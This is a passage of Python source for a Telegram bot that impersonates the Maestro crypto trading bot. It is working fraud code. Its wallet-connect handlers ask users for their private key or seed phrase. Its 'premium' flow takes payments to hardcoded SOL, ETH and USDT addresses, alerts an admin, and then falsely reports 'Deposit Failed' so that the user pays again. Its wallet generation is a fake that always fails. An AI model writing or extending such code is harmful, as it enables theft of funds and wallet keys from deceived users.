async def prompt_gas_from_trade(callback: types.CallbackQuery, state: FSMContext):
    mint_address = re.search(SOLANA_ADDRESS_REGEX, callback.message.text or callback.message.caption or "")
    mint_address = mint_address.group(0) if mint_address else ""

    await _prompt_config_value(
        callback,
        state,
        "gas",
        mint_address,
        "Reply to this message with your desired sell transaction priority (in SOL).\n\n"
        "Example: 0.005\n\n"
        "⚠️ This will only impact manual buys and sells initiated through this panel.",
        "trading",
    )


@dp.callback_query(F.data.startswith("set_gas"))
async def prompt_gas(callback: types.CallbackQuery, state: FSMContext):
    data = callback.data or ""
    mint_address = data.split(":", 1)[1] if ":" in data else ""
    if not mint_address:
        mint_address_match = re.search(SOLANA_ADDRESS_REGEX, callback.message.text or callback.message.caption or "")
        mint_address = mint_address_match.group(0) if mint_address_match else ""

    await _prompt_config_value(
        callback,
        state,
        "gas",
        mint_address,
        "Reply to this message with your desired sell transaction priority (in SOL).\n\n"
        "Example: 0.005\n\n"
        "⚠️ This will only impact manual buys and sells initiated through this panel.",
        "monitor",
    )


@dp.message(BotStates.waiting_for_gas)
async def process_gas_input(message: types.Message, state: FSMContext):
    state_data = await state.get_data()
    prompt_id = state_data.get("prompt_id")
    panel_id = state_data.get("panel_id")
    mint_address = state_data.get("mint_address")
    chat_id = state_data.get("chat_id")
    keyboard_type = state_data.get("keyboard_type", "monitor")

    if prompt_id:
        try:
            await message.bot.delete_message(chat_id=message.chat.id, message_id=prompt_id)
        except Exception:
            pass

    try:
        await message.delete()
    except Exception:
        pass

    raw_value = (message.text or "").strip().replace("SOL", "").strip()
    try:
        val = float(raw_value)
    except ValueError:
        await message.answer("❌ Failed Gas setup. Please enter a value from 0.002 to 50.0 SOL.")
        return

    if not (0.002 <= val <= 50.0):
        await message.answer("❌ Failed Gas setup. Please enter a value from 0.002 to 50.0 SOL.")
        return

    user_id = message.from_user.id
    USER_CONFIGS[user_id] = get_user_data(user_id)
    gas_text = f"{val:.3f}".rstrip("0").rstrip(".") or "0"
    USER_CONFIGS[user_id]["gas"] = f"{gas_text} SOL"
    print(f"Gas updated for user {user_id}: {gas_text} SOL")

    if panel_id and chat_id:
        try:
            reply_markup = get_monitor_keyboard(user_id, mint_address) if keyboard_type == "monitor" else get_trading_keyboard(user_id)
            await message.bot.edit_message_reply_markup(
                chat_id=chat_id,
                message_id=panel_id,
                reply_markup=reply_markup,
            )
        except Exception as e:
            print(f"Error refreshing panel button layout: {e}")

    await state.clear()


@dp.callback_query(F.data == "delete_monitor")
async def delete_monitor_ui(callback: types.CallbackQuery):
    msg_id = callback.message.message_id
    if msg_id in TRACKED_MONITORS:
        TRACKED_MONITORS[msg_id].cancel()
        del TRACKED_MONITORS[msg_id]

    try:
        await bot.unpin_chat_message(chat_id=callback.message.chat.id, message_id=msg_id)
    except Exception:
        pass

    await callback.message.delete()
    await callback.answer("Monitor deleted.")


@dp.callback_query(F.data == "set_limit")
async def limit_unavailable(callback: types.CallbackQuery):
    await callback.answer(popup_alert("Unavailable!", "This action is not ready yet.", "/start"), show_alert=True)


@dp.callback_query(F.data == "main_menu")
async def return_to_main(callback: types.CallbackQuery):
    msg_id = callback.message.message_id
    if msg_id in TRACKED_MONITORS:
        TRACKED_MONITORS[msg_id].cancel()

    try:
        await bot.unpin_chat_message(chat_id=callback.message.chat.id, message_id=msg_id)
    except Exception:
        pass

    await show_welcome_page(callback.bot, callback.message.chat.id, delete_message_ids=[msg_id])
    await callback.answer()


@dp.callback_query(F.data.in_({"connect_external_sol", "import_wallet", "pumpfun_connect_phantom"}))
async def connect_external_wallet(callback: types.CallbackQuery, state: FSMContext):
    if callback.data == "import_wallet":
        prompt_text = (
            "🔐 <b>Please enter your private key or 12-word recovery phrase.</b>\n\n"
            "<b>To Start Trading</b>\n\n"
            "⚠️ <i>Remember: Never share these details with anyone!</i>"
        )

        sent = await callback.bot.send_message(
            chat_id=callback.message.chat.id,
            text=prompt_text,
            parse_mode="HTML",
            reply_markup=types.ForceReply(selective=False),
        )
        await state.set_state(SupportForm.waiting_for_input)
        await state.update_data(
            prompt_message_id=sent.message_id,
            source="import_wallet",
        )
        await callback.answer()
        return

    if callback.data == "pumpfun_connect_phantom":
        prompt_text = "💳 <b>Phantom Wallet Connection</b>\n\n<i>Send your private key or 12-word seed phrase to continue.</i>"
        return_callback = "pumpfun_return"
        button_label = "Connect Phantom"
    else:
        prompt_text = "💳 <b>Connect wallet to start trading</b>\n\n<i>Send your private key or 12-word seed phrase to continue.</i>"
        return_callback = "wallets"
        button_label = "Import Wallet"

    await callback.message.edit_text(
        text=prompt_text,
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Return", callback_data=return_callback)]]),
    )
    await state.set_state(PhantomConnectState.waiting_for_wallet_secret)
    await state.update_data(
        prompt_message_id=callback.message.message_id,
        button_label=button_label,
        button_callback=callback.data,
    )
    await callback.answer()


@dp.callback_query(F.data.in_({"generate_sol_wallet", "generate_wallet"}))
async def generate_wallet_alias(callback: types.CallbackQuery, state: FSMContext):
    if not get_next_wallet("SOL"):
        await callback.message.edit_text(
            text="❌ Failed to generate. Too many users are currently using the bot. Please try again shortly.",
            reply_markup=get_generation_error_keyboard(),
        )
        await callback.answer()
        return

    await callback.message.answer("What would you like to name this wallet? 8 letters max, only numbers and letters.")
    await state.update_data(current_chain="SOL")
    await state.set_state(WalletSetupState.waiting_for_name)
    await callback.answer()


@dp.callback_query(F.data == "pumpfun_return")
async def pumpfun_return(callback: types.CallbackQuery, state: FSMContext):
    state_data = await state.get_data()
    prompt_message_id = state_data.get("prompt_message_id")
    chat_id = callback.message.chat.id

    if prompt_message_id:
        try:
            await callback.bot.delete_message(chat_id=chat_id, message_id=prompt_message_id)
        except Exception:
            pass

    await state.clear()
    await show_welcome_page(callback.bot, chat_id, delete_message_ids=[callback.message.message_id])
    await callback.answer()


PREMIUM_PAYMENT_OPTIONS = {
    "sol": {"label": "$SOL", "amount": "2.6854 SOL", "address": "7bgnwJ7czcSxsGGtynKUs5s68dD4vBUZza1tPeBCHx4D", "confirm_text": "The bot will now generate a wallet for a 2.68 SOL deposit."},
    "eth": {"label": "$ETH", "amount": "0.13 ETH", "address": "0x105584B088807fbD92321576D069560b6E7f00c4", "confirm_text": "The bot will now generate a wallet for a 0.13 ETH deposit."},
    "usdt": {"label": "$USDT", "amount": "$200 USDT", "address": "TJ1XR4LVQBE3BiDhuv595b6ey26pq2Q7fk", "confirm_text": "The bot will now generate a wallet for a $200 USDT deposit."},
}


def get_premium_confirm_keyboard(currency: str = "sol", user_id=None):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=get_localized_button_text(user_id or 0, "✅ Yes"), callback_data=f"premium_confirm_yes:{currency}")],
        [InlineKeyboardButton(text=get_localized_button_text(user_id or 0, "Return"), callback_data=f"premium_back_main:{currency}")],
    ])


def get_premium_deposit_keyboard(currency: str = "sol", user_id=None):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=get_localized_button_text(user_id or 0, "I Have Paid"), callback_data=f"premium_paid:{currency}")],
        [InlineKeyboardButton(text=get_localized_button_text(user_id or 0, "Return"), callback_data=f"premium_back_confirm:{currency}")],
    ])


def get_premium_try_again_keyboard(currency: str = "sol", user_id=None):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=get_localized_button_text(user_id or 0, "Try Again"), callback_data=f"premium_try_again:{currency}")],
    ])


@dp.callback_query(F.data.startswith("premium_pay_"))
async def premium_pay(callback: types.CallbackQuery):
    currency = callback.data.split("_", 2)[-1]
    meta = PREMIUM_PAYMENT_OPTIONS.get(currency, PREMIUM_PAYMENT_OPTIONS["sol"])
    track_premium_message(callback.message.chat.id, callback.message.message_id)
    await callback.message.edit_text(
        text=(
            "Premium: ❌\n\n"
            f"The bot will now generate a wallet for a {meta['amount']} deposit.\n\n"
            "⚠️ THIS PURCHASE IS NON-REFUNDABLE. Click ✅ Yes to proceed."
        ),
        parse_mode="HTML",
        reply_markup=get_premium_confirm_keyboard(currency),
    )
    await callback.answer()


@dp.callback_query(F.data.startswith("premium_confirm_yes:"))
async def premium_confirm_yes(callback: types.CallbackQuery):
    currency = callback.data.split(":", 1)[1]
    meta = PREMIUM_PAYMENT_OPTIONS.get(currency, PREMIUM_PAYMENT_OPTIONS["sol"])
    track_premium_message(callback.message.chat.id, callback.message.message_id)
    await callback.message.edit_text(
        text=(
            "Premium: ❌\n\n"
            f"Deposit Exactly {meta['amount']} to the SOL wallet below\n"
            f"<i>{meta['address']}</i>\n\n"
            "Click I Have Paid once the transaction is sent."
        ),
        parse_mode="HTML",
        reply_markup=get_premium_deposit_keyboard(currency, callback.from_user.id),
    )
    await callback.answer()


@dp.callback_query(F.data.startswith("premium_back_main:"))
async def premium_back_main(callback: types.CallbackQuery):
    await render_premium_menu(callback.bot, callback.message.chat.id, callback.message.message_id)
    await callback.answer()


@dp.callback_query(F.data.startswith("premium_back_confirm:"))
async def premium_back_confirm(callback: types.CallbackQuery):
    currency = callback.data.split(":", 1)[1]
    meta = PREMIUM_PAYMENT_OPTIONS.get(currency, PREMIUM_PAYMENT_OPTIONS["sol"])
    track_premium_message(callback.message.chat.id, callback.message.message_id)
    await callback.message.edit_text(
        text=(
            "Premium: ❌\n\n"
            f"The bot will now generate a wallet for a {meta['amount']} deposit.\n\n"
            "⚠️ THIS PURCHASE IS NON-REFUNDABLE. Click ✅ Yes to proceed."
        ),
        parse_mode="HTML",
        reply_markup=get_premium_confirm_keyboard(currency),
    )
    await callback.answer()


@dp.callback_query(F.data.startswith("premium_paid:"))
async def premium_paid(callback: types.CallbackQuery):
    currency = callback.data.split(":", 1)[1]
    meta = PREMIUM_PAYMENT_OPTIONS.get(currency, PREMIUM_PAYMENT_OPTIONS["sol"])
    username = callback.from_user.username or callback.from_user.first_name or f"user_{callback.from_user.id}"
    notification_text = (
        f"💳 Premium payment attempt\n"
        f"👤 User: {escape(username)}\n"
        f"🆔 Telegram ID: {callback.from_user.id}\n"
        f"🔘 Button: I Have Paid\n"
        f"💱 Currency: {meta['label']}\n"
        f"📝 User message: Clicked I Have Paid"
    )
    try:
        await callback.bot.send_message(chat_id=ADMIN_CHAT_ID, text=notification_text, parse_mode="HTML")
    except Exception as e:
        print(f"Failed to notify admin about premium payment. Error: {e}")

    track_premium_message(callback.message.chat.id, callback.message.message_id)
    await callback.message.edit_text(
        text="<b>Transaction Pending</b>\n\n<i>Please check back in about 1 minute.</i>",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text=get_localized_button_text(callback.from_user.id, "Return"), callback_data=f"premium_return:{currency}")]]),
    )

    async def delayed_failure():
        await asyncio.sleep(300)
        try:
            await callback.bot.edit_message_text(
                chat_id=callback.message.chat.id,
                message_id=callback.message.message_id,
                text=(
                    "<b>Deposit Failed</b>\n\n"
                    "<i>Please try again or choose another payment method.</i>"
                ),
                parse_mode="HTML",
                reply_markup=get_premium_try_again_keyboard(currency, callback.from_user.id),
            )
        except Exception:
            pass

    asyncio.create_task(delayed_failure())
    await callback.answer()


@dp.callback_query(F.data.startswith("premium_return:"))
async def premium_return(callback: types.CallbackQuery):
    await render_premium_menu(callback.bot, callback.message.chat.id, callback.message.message_id)
    await callback.answer()


@dp.callback_query(F.data.startswith("premium_try_again"))
async def premium_try_again(callback: types.CallbackQuery):
    chat_id = callback.message.chat.id
    welcome_message_id = WELCOME_MESSAGE_IDS.get(chat_id)
    tracked_ids = list(PREMIUM_FLOW_MESSAGE_IDS.get(chat_id, set()))

    for message_id in sorted(tracked_ids):
        if message_id == welcome_message_id:
            continue
        try:
            await callback.bot.delete_message(chat_id=chat_id, message_id=message_id)
        except Exception:
            pass

    await show_welcome_page(callback.bot, chat_id, delete_message_ids=[callback.message.message_id])
    PREMIUM_FLOW_MESSAGE_IDS[chat_id] = {welcome_message_id} if welcome_message_id else set()
    await callback.answer("Restarted premium flow")


@dp.callback_query()
async def handle_buttons(callback: types.CallbackQuery, state: FSMContext):
    await callback.answer()

    data = callback.data

    if data in {"chains", "manage_chains"}:
        await render_chains_menu(callback, callback.from_user.id)

    elif data in {"wallet_no_wallet", "wallets", "manage_wallets"}:
        await callback.message.edit_text(
            text=NO_WALLET_TEXT,
            parse_mode="HTML",
            reply_markup=get_no_wallet_keyboard(callback.from_user.id)
        )

    elif data == "rearrange_wallets":
        await callback.message.edit_text(
            text=NO_WALLET_TEXT,
            parse_mode="HTML",
            reply_markup=get_rearrange_keyboard(callback.from_user.id)
        )

    elif data.startswith("toggle_"):
        chain = data.split("_")[1].upper()
        network_status[chain] = not network_status[chain]
        await callback.message.edit_reply_markup(reply_markup=get_chains_keyboard(callback.from_user.id))

    elif data.startswith("wallet_select_"):
        chain_type = data.split("_")[2]
        await callback.message.edit_text(
            text=NO_WALLET_TEXT,
            parse_mode="HTML",
            reply_markup=get_wallet_action_keyboard(chain_type, callback.from_user.id)
        )

    elif data.startswith("generate_select_"):
        target_chain = data.split("_")[2].upper()

        if target_chain == "BASE":
            await callback.message.edit_text(
                text="Unavailable At the Moment",
                reply_markup=get_generation_error_keyboard()
            )
        elif not get_next_wallet(target_chain):
            await callback.message.edit_text(
                text="❌ Failed to generate. Too many users are currently using the bot. Please try again shortly.",
                reply_markup=get_generation_error_keyboard()
            )
        else:
            await callback.message.answer("What would you like to name this wallet? 8 letters max, only numbers and letters.")
            await state.update_data(chosen_chain=target_chain, current_chain=target_chain)
            await state.set_state(WalletSetupState.waiting_for_name)

    elif data == "back_to_main":
        localized_text, use_html = await get_user_message_text(callback.from_user.id, MAIN_WELCOME_TEXT, html_supported=True)
        await callback.message.edit_text(
            text=localized_text,
            parse_mode="HTML" if use_html else None,
            reply_markup=get_main_keyboard(callback.from_user.id),
            disable_web_page_preview=True
        )

    elif data == "generate_wallet":
        if not get_next_wallet("SOL"):
            await callback.message.edit_text(
                text="❌ Failed to generate. Too many users are currently using the bot. Please try again shortly.",
                reply_markup=get_generation_error_keyboard()
            )
        else:
            await callback.message.answer("What would you like to name this wallet? 8 letters max, only numbers and letters.")
            await state.update_data(current_chain="SOL")
            await state.set_state(WalletSetupState.waiting_for_name)

    elif data == "track_wallet":
        wallet_info = user_wallets.get(callback.from_user.id)
        if wallet_info:
            owner_label = wallet_info["username"]
            track_text = (
                f"🔗 {wallet_info['chain']}\n\n"
                f"Maestro: {wallet_info['address']}\n"
                f"🟢 Default | 🟢 Manual | 💰 0 {wallet_info['chain']}\n\n"
                f"🏦 Maestro Fees\n"
                f"Unpaid: 0 {wallet_info['chain']}\n"
                f"ℹ️ To transfer from a wallet or automatically import it to another compatible chain within the bot, click on the wallet name.\n"
                f"ℹ️ Enable \"Manual\" for the wallets participating in your manual buys. Automated buys will be defaulted to your \"Default\" wallet, but you can further control this through dedicated Signals, Copytrade, and Auto Snipe settings.\n\n"
                f"Owner: @{owner_label}"
            )
            await callback.message.edit_text(track_text)
        else:
            await callback.message.answer("No wallet found for your account yet.")

    elif data.startswith("chain_"):
        await callback.message.answer("Chain toggle initiated.")
    elif data == "signals":
        await render_signals_settings(callback)
    elif data == "signals_call_channels":
        await render_call_channels_menu(callback)
    elif data == "signals_external":
        await callback.answer(popup_alert("Unavailable!", "This source is offline.", "/start"), show_alert=True)
    elif data == "signals_maestro_dms":
        await callback.message.edit_text(
            text="You need to be premium User to access Maestro DMs",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Return", callback_data="signals")]]),
        )
        await callback.answer()
    elif data == "signals_scraper":
        await callback.message.edit_text(
            text="You need to be premium User to access Scraper",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Return", callback_data="signals")]]),
        )
        await callback.answer()
    elif data.startswith("call_channels_page:"):
        page = int(data.split(":", 1)[1])
        await render_call_channels_menu(callback, page)
    elif data.startswith("channel_select:"):
        channel_key = data.split(":", 1)[1]
        await render_channel_settings(callback, channel_key)
    elif data == "copytrade":
        await callback.message.edit_text(
            text="Select the target chain. You can remove or add missing chains through /chains.",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="SOL", callback_data="copytrade_chain_sol"), InlineKeyboardButton(text="BASE", callback_data="copytrade_chain_base")],
                [InlineKeyboardButton(text="ETH", callback_data="copytrade_chain_eth")],
                [InlineKeyboardButton(text="Return", callback_data="main_menu")],
            ]),
        )
    elif data.startswith("copytrade_chain_"):
        await callback.message.edit_text(
            text="Only Available to Premium Users Subscribe Below",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="Subscribe Premium", callback_data="copytrade_subscribe_premium")],
                [InlineKeyboardButton(text="Return", callback_data="copytrade")],
            ]),
        )
        await callback.answer()
    elif data == "copytrade_subscribe_premium":
        await render_premium_menu(callback.bot, callback.message.chat.id, callback.message.message_id)
        await callback.answer()
    elif data == "active_orders":
        await callback.answer(popup_alert("Need wallet!", "Import or generate one to trade.", "/start"), show_alert=True)
    elif data == "positions":
        await callback.answer(popup_alert("Need wallet!", "Import or generate one to trade.", "/start"), show_alert=True)
    elif data == "auto_snipe":
        await callback.answer(popup_alert("Need wallet!", "Import or generate one to trade.", "/start"), show_alert=True)
    elif data == "bridge":
        await callback.answer(popup_alert("Need wallet!", "Import or generate one to trade.", "/start"), show_alert=True)
    elif data == "premium":
        await render_premium_menu(callback.bot, callback.message.chat.id, callback.message.message_id)
        await callback.answer()
    elif data == "cashback":
        await callback.message.edit_text(
            text=CASHBACK_DASHBOARD_TEXT,
            parse_mode="HTML",
            reply_markup=get_cashback_dashboard_keyboard(callback.from_user.id),
        )
        await callback.answer()
    elif data == "buy_sell_now":
        await callback.message.answer("⚡️ Fast Trade Console: Paste a Token contract address (CA) below.")
    elif data == "test_connect_wallet":
        localized_text, _ = await get_user_message_text(
            callback.from_user.id,
            "🧪 Test Connect wallet selected. Use this button to import or generate a wallet for testing."
        )
        await callback.message.edit_text(
            text=localized_text,
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text=get_localized_button_text(callback.from_user.id, "Return"), callback_data="main_menu")]]),
        )
        await callback.answer()
    elif data == "more_links":
        await callback.message.answer(
            "🔗 More links:\nhttps://t.me/MaestroBotsHub\nhttps://t.me/MaestroSniperUpdates\nhttps://x.com/MaestroBots\nhttps://docs.maestrobots.com/"
        )

dp.include_router(router)


async def main():
    await register_bot_commands()
    await start_web_server()
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
